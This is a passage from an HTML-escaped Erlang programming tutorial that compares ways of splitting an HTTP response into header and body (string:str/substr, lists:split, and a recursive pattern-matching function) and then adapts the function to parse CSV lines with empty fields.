 &lt;span class="s"&gt;&amp;quot;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's try something else ...&lt;/p&gt;
&lt;h2&gt;Offset and sub-string&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/string.html#str-2"&gt;string:str/2&lt;/a&gt; allows you to retrieve
the offset of a specific sequence in a string while
&lt;a href="http://erlang.org/doc/man/string.html#substr-2"&gt;string:substr&lt;/a&gt; helps you extract
a sub-string based on its starting offset and its length.&lt;/p&gt;
&lt;p&gt;One way of doing it would then be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c"&gt;% first retrieve the header&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c"&gt;% then the body&lt;/span&gt;
&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This works but you must admit it is not very elegant. Moreover you have to
play with the offset value to get exactly the part you want. Not nice !
Moreover you can only split a string in two and thus wouldn't easily be
able to split a string in more than two fields.&lt;/p&gt;
&lt;h2&gt;Offset and split&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://erlang.org/doc/man/lists.html#split-2"&gt;lists:split/2&lt;/a&gt; will split the
list provided in argument in two lists with the first one containing the N first
char(s):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;Header&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Body&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Offset&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is a bit better but we still have to strip the two returned strings in order
to remove the separator &lt;code&gt;\r\n&lt;/code&gt;. Moreover, as the previous example, you cannot
easily split a string in more than two fields.&lt;/p&gt;
&lt;h2&gt;Coding way&lt;/h2&gt;
&lt;p&gt;This is IMHO the best way for our use-case. Unlike the other
solutions this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;is easily customizable&lt;/li&gt;
&lt;li&gt;handles errors and cases when no match is found&lt;/li&gt;
&lt;li&gt;looks very elegant and uses erlang's power&lt;/li&gt;
&lt;li&gt;[bonus] allows to split in more than two fields&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Without further introduction, here's how I did this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="ni"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;CRLF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;

&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;++?&lt;/span&gt;&lt;span class="nv"&gt;CRLF&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;([],&lt;/span&gt; &lt;span class="p"&gt;_&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This allows, using list comprehension and pattern matching, to nicely
separate the header of the body:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nn"&gt;file&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;read_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;binary_to_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Bin&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;parse_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;HTTP/1.1 302 Found&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Cache-Control: private&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Location: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Content-Length: 256&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Date: ...&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;Server: GFE/2.0&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;meta http-equiv=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;content-type&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; content=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;text/html;charset=utf-8&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;TITLE&amp;gt;302 Moved&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;H1&amp;gt;302 Moved&amp;lt;/H1&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;The document has moved&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;A HREF=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;...&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;&amp;gt;here&amp;lt;/A&amp;gt;.&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A little explanation on how that works:&lt;/p&gt;
&lt;p&gt;While no successive CRLFs are found, go through the string, char by char
(using &lt;code&gt;[H|T]&lt;/code&gt;), and prepend the processed char (&lt;code&gt;H&lt;/code&gt;) to the accumulator.
Once two CRLFs are found, we reverse the accumulator (since
it was built in reverse order) and construct the resulting list.
If no &lt;code&gt;\r\n\r\n&lt;/code&gt; is found, a list of two empty lists is returned.&lt;/p&gt;
&lt;p&gt;This function can then be improved to handle the splitting of several fields,
as for example in a csv line where fields are separated by a comma. We wouldn't
be able to use &lt;code&gt;string:tokens&lt;/code&gt; since we want to be able to see empty fields:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="ni"&gt;define&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;SEP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;

&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nv"&gt;SEP&lt;/span&gt; &lt;span class="o"&gt;++&lt;/span&gt; &lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;))|&lt;/span&gt;&lt;span class="n"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Rest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[])];&lt;/span&gt;
&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="n"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;T&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;H&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;([],&lt;/span&gt; &lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nn"&gt;lists&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Acc&lt;/span&gt;&lt;span class="p"&gt;))].&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;resulting in (you can see the difference with &lt;code&gt;string:tokens&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;Line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;field1,ofjeofje    ,field3, foefjoejfe,    field5,,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;span class="s"&gt;&amp;quot;field1,ofjeofje    ,field3, foefjoejfe,    field5,,&amp;quot;&lt;/span&gt;
&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;parse_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[]).&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ofjeofje&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;foefjoejfe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;field5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,[],[]]&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nf"&gt;tokens&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;Line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
